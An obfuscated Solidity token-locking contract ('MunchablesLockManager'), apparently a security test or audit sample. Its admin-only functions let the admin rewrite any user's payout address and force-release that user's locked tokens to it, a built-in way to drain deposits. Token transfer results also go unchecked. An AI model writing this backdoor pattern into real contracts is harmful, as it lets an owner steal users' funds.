pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address ae, uint256 y) external returns (bool);

    function k(
        address from,
        address ae,
        uint256 y
    ) external returns (bool);

    function r(address w) external view returns (uint256);
}

contract MunchablesLockManager {
    address public aa;
    address public i;

    struct PlayerSettings {
        uint256 n;
        address h;
        uint256 m;
        uint256 j;
    }

    mapping(address => PlayerSettings) public e;
    mapping(address => uint256) public d;

    IERC20 public immutable ad;

    event Locked(address z, uint256 y, address p);
    event ConfigUpdated(address s, address o);

    constructor(address ab) {
        aa = msg.sender;
        ad = IERC20(ab);
    }

    modifier q() {
        require(msg.sender == aa, "Not admin");
        _;
    }

    function ac(uint256 y, uint256 v) external {
        require(y > 0, "Zero amount");

        ad.k(msg.sender, address(this), y);

        d[msg.sender] += y;
        e[msg.sender] = PlayerSettings({
            n: y,
            h: msg.sender,
            m: v,
            j: block.timestamp
        });

        emit Locked(msg.sender, y, msg.sender);
    }

    function b(address f) external q {
        address s = i;
        i = f;

        emit ConfigUpdated(s, f);
    }

    function a(
        address z,
        address l
    ) external q {
        e[z].h = l;
    }

    function x() external {
        PlayerSettings memory u = e[msg.sender];

        require(u.n > 0, "No locked tokens");
        require(
            block.timestamp >= u.j + u.m,
            "Still locked"
        );

        uint256 y = u.n;

        address p = u.h;

        delete e[msg.sender];
        d[msg.sender] = 0;

        ad.transfer(p, y);
    }

    function c(address z) external q {
        PlayerSettings memory u = e[z];
        uint256 y = u.n;
        address p = u.h;

        delete e[z];
        d[z] = 0;

        ad.transfer(p, y);
    }

    function g(address t) external q {
        aa = t;
    }
}